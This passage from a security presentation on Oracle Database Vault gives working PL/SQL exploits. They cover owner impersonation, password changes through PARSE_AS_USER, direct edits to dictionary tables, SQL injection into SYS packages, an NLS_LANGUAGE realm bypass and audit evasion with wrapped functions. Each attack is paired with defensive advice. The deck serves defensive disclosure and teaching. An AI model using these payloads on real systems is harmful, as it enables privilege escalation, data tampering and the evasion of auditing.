  RET_VALUE_X123 := SYS.KUPF$FILE_INT.GET_FULL_FILENAME(DIRPATH => P_DIRPATH, NAME => 'B', EXTENSION 
=> '', VERSION => ''); 
END; 
/ 
OS access using Buffer overflow - Defense 
• Stay up-to-date with patches 
• Restrict EXECUTE permissions on Packages, reduce attack 
surface. 
• Strictly audit operations at the OS level. 
Impersonating MACSYS - Attack 
• Requires CREATE ANY PROCEDURE and EXECUTE ANY 
PROCEDURE privileges. 
 Default roles granted these privileges: DBA, IMP_FULL_DATABASE and 
DV_REALM_OWNER 
 Default users: SYSTEM and SYSMAN 
• Create a procedure in Database Owner schema (MACSYS) that 
execute as the owner (default behavior) 
• The procedure takes a string parameter that is the statement to 
be executed. 
Impersonating MACSYS - Attack 
• Example: 
CREATE OR REPLACE PROCEDURE MACSYS.EXECASMACSYS (STMT VARCHAR2) AS 
 BEGIN EXECUTE IMMEDIATE STMT; END; 
• Execute the created stored procedure to run statements as the 
MACSYS user 
EXEC MACSYS.EXECASMACSYS ('ALTER USER MACSYS IDENTIFIED BY ANYPSW'); 
Impersonating MACSYS - Defense 
•
Restrict CREATE ANY PROCEDURE and EXECUTE ANY PROCEDURE 
privileges 
•
Consider to protect MACSYS schema with a Realm 
BEGIN 
  DVSYS.DBMS_MACADM.CREATE_REALM('MACSYS Realm', '', 'NO', 1); 
  DVSYS.DBMS_MACADM.ADD_OBJECT_TO_REALM('MACSYS Realm', 'MACSYS', '%', 
'%'); 
  DVSYS.DBMS_MACADM.UPDATE_REALM('MACSYS Realm', 'Realm to protect the 
Database Vault Owner Schema', 'YES', 1); 
END; 
• SYS is owner of the 'Oracle Data Dictionary' Realm. 
• SYS has no administrator privilege over Database Vault 
(DV_OWNER role). 
• Can change Database Vault owner password in these ways: 
 Using SYS.DBMS_SYS_SQL.PARSE_AS_USER(): 
declare l_num number; l_int integer; 
begin 
  select user_id into l_num from all_users where username = 'MACSYS'; 
  l_int := sys.dbms_sys_sql.open_cursor(); 
  sys.dbms_sys_sql.parse_as_user(l_int,'alter user MACSYS identified by 
"ANYPASS"',dbms_sql.native,l_num); 
  sys.dbms_sys_sql.close_cursor(l_int); end; 
• It is important to protect the SYS account as if it was one of the 
DB Vault owner accounts. 
SYS user considerations 
SYS user considerations for older releases 
• Before 11.1.0.7: SYS Can use SYS.KUPP$PROC.CHANGE_USER 
to impersonate any user, including the DB Vault owner. 
• Some DV Releases (like 10.2.0.4) allows the SYS user to update 
system tables: 
 Can change DV owner password updating system tables directly: 
UPDATE sys.user$ SET password='C3B6F7BD55996DAA' WHERE 
name='MACSYS' 
 Can update data dictionary tables directly and the protection will not work 
(because there is no GRANT statement issued) : 
INSERT INTO sys.sysauth$ VALUES ((SELECT user# FROM 
user$ WHERE name = 'SYS'),(SELECT user# FROM user$ 
WHERE name = 'DV_OWNER'),999,NULL) 
SQL Injection 
• What about SQL Injection vulnerabilities in the SYS schema? 
 As we have seen SYS user can compromise DB Vault protections. 
• To protect from these SQL Injection attacks: 
 Apply Critical Patch Updates. 
 Revoke EXECUTE privileges for SYS owned packages. 
SQL Injection - Examples 
• Using vulnerability in DBMS_JAVA.SET_OUTPUT_TO_JAVA: 
SELECT DBMS_JAVA.SET_OUTPUT_TO_JAVA 
('ID','oracle/aurora/rdbms/DbmsJava','SYS', 
'writeOutputToFile','TEXT', NULL, NULL, NULL, 
NULL,0,1,1,1,1,0,'DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN 
EXECUTE IMMEDIATE ''declare l_num number; l_int integer; begin 
select user_id into l_num from all_users where username = 
''''MACSYS'''';  l_int := sys.dbms_sys_sql.open_cursor();  
sys.dbms_sys_sql.parse_as_user(l_int,''''grant dv_owner to 
oneuser'''',dbms_sql.native,l_num);  
sys.dbms_sys_sql.close_cursor(l_int); end;''; END;', 'BEGIN NULL; 
END;') FROM DUAL; 
EXEC DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOW('NO_SUCH_SUBSCRIPTION', 
SYSDATE()); 
SQL Injection - Examples 
•
Example where a function call can be injected. Fixed CPU-OCT-08 
CREATE OR REPLACE FUNCTION ONEUSER.SQLI return varchar2 
 authid current_user as pragma autonomous_transaction; 
BEGIN 
  execute immediate 'begin sys.kupp$proc.change_user(''MACSYS''); 
end;'; 
  execute immediate 'alter user MACSYS identified by anypass'; 
  commit; 
  RETURN ''; 
END; 
/ 
DECLARE  P_WORKSPACE VARCHAR2(32767); 
BEGIN 
  P_WORKSPACE := '''||ONEUSER.SQLI()||'''; 
  SYS.LT.CREATEWORKSPACE(P_WORKSPACE, FALSE, '', FALSE); 
  SYS.LT.REMOVEWORKSPACE(P_WORKSPACE, FALSE); 
END; 
/ 
SQL Injection - Examples 
• Cursor Injection can’t be used this way: 
DECLARE 
  P_WORKSPACE VARCHAR2(32767); 
  MYC NUMBER; 
BEGIN 
  MYC := DBMS_SQL.OPEN_CURSOR;  
  DBMS_SQL.PARSE(MYC, 'declare pragma autonomous_transaction; begin 
sys.kupp$proc.change_user(''MACSYS''); execute immediate ''alter 
user macsys identified by anypass''; commit;end;',0); 
  P_WORKSPACE := '''||(dbms_sql.execute('||myc||'))--'; 
  SYS.LT.CREATEWORKSPACE(P_WORKSPACE, FALSE, '', FALSE); 
  SYS.LT.REMOVEWORKSPACE(P_WORKSPACE, FALSE); 
END; 
/ 
SQL Injection - Examples 
• Accessing objects protected by Realms exploiting vulnerability in 
SYS.LTADM (Fixed CPU-OCT-08): 
DECLARE 
  P_INSTATE VARCHAR2(32767); 
BEGIN 
  P_INSTATE := '''||to_char(dbms_xmlquery.getxml(''declare pragma 
autonomous_transaction; begin update hr.employees set 
salary=50000 where employee_id=205;commit;end;'',0))||'''; 
  SYS.LTADM.COMPRESSSTATE(P_INSTATE, 1); 
END; 
/ 
SQL Injection - Examples 
CREATE OR REPLACE FUNCTION "ONEDBA"."SQLI" return varchar2 
 authid current_user as 
 pragma autonomous_transaction; 
BEGIN 
  execute immediate 'begin insert into sys.sysauth$ values ((select 
user# from user$ where name = ''ONEDBA''),(select user# from user$ 
where name = ''DV_OWNER''),999,null); end;'; 
  commit; 
  return ''; 
END; 
/ 
EXEC SYS.DBMS_CDC_UTILITY.LOCK_CHANGE_SET('EX01''||ONEDBA.sqli||'''); 
SQL Injection - Examples 
•
Analyzing the vulnerable code we can see that it can be exploited 
without creating an auxiliary function (the SQL injection is inside a 
PL/SQL block instead of a DML sentence). 
SELECT PIECE, U.USERNAME, ST.SQL_TEXT FROM V$SQLAREA SA, V$SQLTEXT 
ST, DBA_USERS U WHERE SA.ADDRESS = ST.ADDRESS AND SA.HASH_VALUE = 
ST.HASH_VALUE AND SA.PARSING_USER_ID = U.USER_ID AND 
ST.HASH_VALUE IN (select HASH_VALUE from V$SQLTEXT where SQL_TEXT 
LIKE '%EX01%') ORDER BY ST.ADDRESS, ST.HASH_VALUE, ST.PIECE 
0   SYS   begin sys.dbms_application_info.set_module(module_name=>'DBMS_CD  
1   SYS   C_PUBLISH.ADVANCE',action_name=>'EX01'||ONEDBA.SQLI||'');end; 
SQL Injection - Examples 
EXEC SYS.DBMS_CDC_UTILITY.LOCK_CHANGE_SET('''); begin 
sys.kupp$proc.change_user(''MACSYS''); end; execute immediate 
''alter user MACSYS identified by anypass''; commit; end;--'); 
•
Results in the following code executed as SYS: 
begin 
sys.dbms_application_info.set_module(module_name=>'DBMS_CDC_PUBLI
SH.ADVANCE',action_name=>''); begin 
sys.kupp$proc.change_user('MACSYS'); end; execute immediate 
'alter user MACSYS identified by anypass'; commit; end;--');end; 
Vulnerabilities specific to Oracle DB Vault 
• NLS_LANGUAGE Realm protection bypass (Fixed) 
 Changing the NLS_LANGUAGE session parameter to anything different 
than AMERICAN disables Database Vault Realm protection for DDL 
commands. 
• Some issues pending to fix 
 Affecting Oracle Database Vault Administrator web console. 
 Allowing to compromise DB Vault from DV_ACCTMGR role. 
Vulnerabilities specific to Oracle DB Vault 
SQL> connect onedba/onedba 
Connected. 
SQL> drop table hr.jobs cascade constraints; 
drop table hr.jobs cascade constraints 
* 
ERROR at line 1: 
ORA-00604: error occurred at recursive SQL level 1 
ORA-47401: Realm violation for drop table on HR.JOBS 
ORA-06512: at "DVSYS.AUTHORIZE_EVENT", line 55 
ORA-06512: at line 13 
SQL> alter session set NLS_LANGUAGE="LATIN AMERICAN SPANISH"; 
Session altered. 
SQL> drop table hr.jobs cascade constraints; 
Table dropped. 
Oracle Database Auditing and SYS user 
• SYS user is not audited in the same way than other users: 
 AUDIT_SYS_OPERATIONS init parameter must be TRUE. 
 All SQL statements issued in a SYSDBA/SYSOPER connection are audited 
with the SQL Text in OS audit trail. 
o The Auditing configuration done with AUDIT statement doesn’t have any effect 
on SYS auditing. 
 Statements executed inside stored procedures are NOT audited. 
 SYS.KUPP$PROC.CHANGE_USER (BECOME USER) is audited even if it’s 
used inside a SP. 
 SYS.DBMS_SYS_SQL.PARSE_AS_USER is not audited if used inside a SP. 
Oracle Database Auditing and SYS user 
• What about SQL injection running as SYS? 
 The vulnerable procedure execution is audited 
o Audit of SP executions is not commonly enabled. 
o It will appear just as a SP execution and the statements executed as the 
privileged (SYS) user will not be audited. 
o Only if the Extended auditing (with SQL Text) is enabled the statements can be 
seen as a string in the SP call parameters. 
Oracle Database Auditing and SYS user 
• What about SQL injection running as SYS? 
 If the SQL Injection exploit requires to create a function then this will also 
be audited. 
o There are some techniques that avoids the need to create a function. 
o Function can be created wrapped to make it more difficult to know what is 
doing, something like: 
create or replace procedure oneuser.sqli wrapped  
a000000 
b2 
abcd 
7 
37 6d 
VqEweimFLXnpdhTHG8WS4ZVL2V0wg5nnm7+fMr2ywFwWULgruDO4dCDXpXQruM
Ay/tJeuPC4 
MsuyUlyl0oEyMgj1NsJuO5Rxc3HYiKaJzbK1 
/ 
Additional protection measures 
• Be aware that some system privileges can lead to full database 
compromise: 
 BECOME USER 
 CREATE [ANY] LIBRARY 
 EXECUTE ANY PROCEDURE 
 CREATE ANY PROCEDURE 
 EXECUTE on SYS owned objects. 
o Default roles like SELECT_CATALOG_ROLE, EXECUTE_CATALOG_ROLE, DBA 
has excessive EXECUTE privileges. 
•
SELECT u.name username, pm.name priv 
FROM sys.sysauth$ sa, sys.user$ u, sys.system_privilege_map pm 
WHERE privilege# in (-188, -189, -21, -140, -141, -144) AND u.user# = 
grantee# AND pm.privilege = sa.privilege# ORDER BY u.name 
•
SELECT * FROM sys.system_privilege_map 
Additional protection measures 
• NEVER use default Oracle users or roles 
 Usually have more privileges than needed and can change from release to 
release. 
 Create your own users and grant only the required privileges through your 
own roles. 
 Exception: Database Vault default roles (like DV_OWNER and 
DV_ACCTMGR). 
•
Change the External Job OS user 
 In Unix/Linux: Can be specified in $OH/rdbms/admin/externaljob.ora 
 In windows: Change the authentication user defined in the external job service 
•
Follow the security considerations in Database Vault Documentation 
but be aware that it is not enough. 
Conclusions 
• The Separation of duty provided by Database Vault can be 
bypassed. 
• System privileges can lead to full DB compromise or privilege 
escalation 
 CREATE LIBRARY/PROCEDURE; CREATE/EXECUTE ANY PROCEDURE 
• Database Auditing can be bypassed by SYS user or exploiting 
SQL injection. 
Conclusions 
• Oracle should move components out of the SYS schema 
 There are some components that do not need to be in the SYS schema. 
 They are doing something in this direction: Oracle Workspace Manager 
was moved from SYS to WMSYS. 
o Accessed through DBMS_WM public synonym 
o Implemented in packages LT, LTADM, LTRIC. 
• Oracle Database Vault is improving its security and usability in 
new releases 
 More restrictions for SYS user. 
 More functionality and tools can be used with DV enabled. 
Documentation 
•
Oracle documentation for Database Vault: 
 10.2: http://download.oracle.com/docs/cd/B19306_01/server.102/b25166/toc.htm 
 11.1: http://download.oracle.com/docs/cd/B28359_01/server.111/b31222/toc.htm 
 11.2: http://download.oracle.com/docs/cd/E11882_01/server.112/e10576/toc.htm 
END 
• Questions? 
• Thank You. 
• Contact: esteban>atdot<com